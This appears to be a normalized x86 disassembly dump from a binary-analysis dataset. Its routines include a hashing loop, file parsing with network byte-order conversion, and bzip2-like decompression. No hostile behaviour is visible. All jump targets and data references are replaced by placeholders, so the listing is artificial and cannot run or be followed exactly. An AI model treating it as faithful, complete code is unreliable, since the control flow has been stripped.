je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov ecx 0x100
div ecx
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x25
mov edx [ ebp - 0x8 ]
movzx eax [ edx ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_40a1d0
push ebp
mov ebp esp
push ecx
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call sub_412b5e
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_409dc0
add esp 0x4
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40a210
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_412a1c
add esp 0x4
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x100
jge r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4121b5
add esp 0x4
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
push eax
call sub_4121b5
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_40a280
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push 0x0
push 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x4
lea edx [ ebp - 0x4 ]
push edx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
push 0x0
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
push 0x1
push 0x8
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
push 0x1
push 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
push 0x1
push 0x4
mov eax [ ebp + 0x10 ]
push eax
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
push 0x1
push 0x4
lea eax [ ebp - 0x10 ]
push eax
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x8
jne r-xdata
push 0x0
push 0x0
push 0x10
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4168aa
add esp 0x10
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x1
mov edx [ ebp + 0xc ]
mov [ edx ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
push 0x1
push 0x4
lea eax [ ebp - 0x14 ]
push eax
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x8
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_416025
add esp 0x4
cmp eax [ ebp - 0x10 ]
jne r-xdata
push 0x1
push 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
push 0x1
push 0x4
lea eax [ ebp - 0xc ]
push eax
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
push 0x1
push 0x4
mov edx [ ebp + 0x1c ]
push edx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
push ecx
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0xc ] eax
push 0x1
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_416025
add esp 0x4
add eax 0x4
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
push ecx
call [ Ordinal_WSOCK32_14@IAT ]
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
cmp [ ebp + 0x18 ] 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_416025
add esp 0x4
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
sub_40a540
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x88 ] 0x0
push 0x60
push 0x0
lea eax [ ebp - 0x87 ]
push eax
call sub_412f80
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x90 ]
push edx
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_40a280
add esp 0x18
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x14 ]
jge r-xdata
or eax 0xffffffff
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
push 0x1
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
call [ Ordinal_WSOCK32_14@IAT ]
sub eax 0x8
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
push 0x1
push 0x4
lea edx [ ebp - 0x8c ]
push edx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8c ]
push eax
call [ Ordinal_WSOCK32_14@IAT ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x1
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x60
jle r-xdata
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
push 0x1
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x88 ]
push ecx
call sub_412518
add esp 0x10
cmp eax 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x88 ]
mov [ ebp - 0x94 ] edx
mov eax [ ebp - 0x94 ]
push eax
call sub_412e40
add esp 0x4
mov [ ebp - 0x98 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x94 ]
mov [ ecx ] edx
mov eax [ ebp - 0x98 ]
mov ecx [ ebp - 0x94 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x94 ] edx
cmp [ ebp - 0x98 ] 0x40
jl r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x94 ]
push ecx
call sub_412e40
add esp 0x4
mov [ ebp - 0x98 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x94 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x98 ]
mov edx [ ebp - 0x94 ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x98 ] 0x20
jl r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
call sub_423201
add esp 0x4
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push ecx
call sub_423201
add esp 0x4
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] 0x0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x0
or eax 0xffffffff
jmp r-xdata
sub_40a780
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push eax
call sub_40a180
add esp 0x4
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x8 ]
add edx 0x10
push edx
call sub_415980
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_40a7d0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
sub edx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x18 ]
jle r-xdata
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
push 0x0
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
add eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_412bff
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
push 0x1
mov eax [ ebp + 0x14 ]
push eax
call sub_412518
add esp 0x10
or eax 0xffffffff
jmp r-xdata
sub_40a850
push ebp
mov ebp esp
call sub_40c1b0
push eax
mov eax [ ebp + 0x8 ]
push eax
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x10
cmp [ ebp + 0x8 ] 0x3ef
jne r-xdata
push 0x3
call sub_41718f
pop ebp
retn
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
sub_40a8a0
push ebp
mov ebp esp
xor eax eax
je r-xdata
xor ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
xor edx edx
je r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn
mov eax 0x1
xor eax eax
jmp r-xdata
sub_40a8d0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
push eax
call sub_412584
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40a910
push ebp
mov ebp esp
push ecx
call sub_40a8a0
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax 0xfffffff7
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp + 0xc ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0xc ] 0x4
jle r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x24 ] sub_40a8d0
push 0x1
push 0xfa74
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
call ecx
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] sub_40a8f0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0xa
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc64 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp - 0x4 ]
mov al [ ebp + 0x10 ]
mov [ edx + 0x28 ] al
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc54 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc50 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc4c ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x2c ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x30 ] eax
xor eax eax
mov eax 0xfffffffd
jmp r-xdata
sub_40aa70
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x100
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x8 ]
sar eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp eax [ edx + ecx * 4 ]
jl r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
cmp eax 0x1
jne r-xdata
sub_40aac0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx 0x1
test ecx ecx
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx 0x1
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x1
jne r-xdata
xor eax eax
push 0x1771
call sub_40a850
add esp 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0xa
jl r-xdata
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x28 ]
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_40c1c0
add esp 0x4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x4
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_40ad10
add esp 0x4
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
push eax
call sub_40b600
add esp 0x4
mov [ ebp - 0x5 ] al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x30 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xfa40 ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x440 ] ecx
jne r-xdata
mov eax 0xfffffffc
jmp r-xdata
movzx edx [ ebp - 0x5 ]
test edx edx
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc64 ]
cmp eax [ edx + 0xc5c ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc64 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc5c ]
push eax
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x10
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc60 ]
not edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc60 ] edx
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x30 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x2
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc60 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc58 ]
push edx
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x10
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc60 ]
cmp eax [ edx + 0xc58 ]
je r-xdata
push rw-data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc64 ]
shl edx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc64 ]
shr ecx 0x1f
or edx ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc64 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc64 ]
xor eax [ edx + 0xc60 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc64 ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0xe
jmp r-xdata
mov eax 0xfffffffc
jmp r-xdata
sub_40ad10
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc60 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x8 ]
mov [ ebp - 0x19 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa40 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx 0x1
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x2c ]
add edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x18 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x18 ]
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ ebp - 0xc ] 0x0
jle r-xdata
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + 0xc60 ] edx
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x19 ]
mov [ eax + 0x8 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x440 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + 0xc4c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x30 ]
mov [ ecx + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x24 ]
mov [ ecx + 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x2c ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x1c ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x1c ] ecx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x8 ]
jle r-xdata
mov eax 0x1
test eax eax
je r-xdata
xor al al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jle r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov al [ ebp - 0x20 ]
mov [ ebp - 0x19 ] al
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
and ecx 0xff
mov [ ebp - 0x1 ] cl
mov edx [ ebp - 0x30 ]
shr edx 0x8
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
movzx ecx [ ebp - 0x1 ]
cmp ecx [ ebp - 0x20 ]
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x24 ]
mov cl [ ebp - 0x19 ]
mov [ eax ] cl
mov edx [ ebp - 0x34 ]
shl edx 0x8
mov eax [ ebp - 0x34 ]
shr eax 0x18
movzx ecx [ ebp - 0x19 ]
xor eax ecx
xor edx [ eax * 4 + rw-data ]
mov [ ebp - 0x34 ] edx
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x2c ]
sub eax 0x1
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x3c ]
mov [ eax + 0x8 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + ecx * 4 ]
mov [ edx + 0x38 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
and edx 0xff
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc60 ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc60 ]
shr eax 0x18
mov edx [ ebp + 0x8 ]
movzx edx [ edx + 0x8 ]
xor eax edx
xor ecx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc60 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
movzx edx [ ebp - 0x1 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov dl [ ebp - 0x19 ]
mov [ ecx ] dl
mov eax [ ebp - 0x34 ]
shl eax 0x8
mov ecx [ ebp - 0x34 ]
shr ecx 0x18
movzx edx [ ebp - 0x19 ]
xor ecx edx
xor eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0xc ]
